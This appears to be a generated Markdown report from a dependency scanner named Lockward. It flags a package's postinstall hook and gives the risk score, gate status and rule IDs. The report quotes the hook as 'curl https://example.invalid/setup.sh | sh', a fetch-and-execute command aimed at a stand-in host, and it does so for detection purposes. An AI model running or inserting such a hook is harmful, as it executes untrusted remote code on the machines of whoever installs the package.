## Lockward

**Target:** `{root}`

**Scanned at:** 2026-10-12T00:00:00Z

**Score:** 50 (high)

**Gate:** Warning · Exit 1 · mode warn

### Why

- `Package mini-app@1.0.0 hook 'postinstall' contacts the network or downloads data. Evidence: 'curl https://example.invalid/setup.sh | sh'.`
- `Package mini-app@1.0.0 hook 'postinstall' pipes a download into a shell. Evidence: 'curl https://example.invalid/setup.sh | sh'.`
- **advisory_coverage:** `1 package was not checked against OSV (offline, no cache entry or a stale cache).`
- **no_outbound_build:** `Package mini-app@1.0.0 hook 'postinstall' downloads during install and does not execute the content (LW-H003).`
- **no_outbound_build:** `Package mini-app@1.0.0 hook 'postinstall' pipes downloaded content into a shell (LW-H004).`

### Install hooks

- `mini-app`@`1.0.0` `postinstall`: `curl https://example.invalid/setup.sh | sh`

### Advisories

No advisories in the cache.

### Notes

- `new_dependencies is inactive for this run because no baseline was passed.`
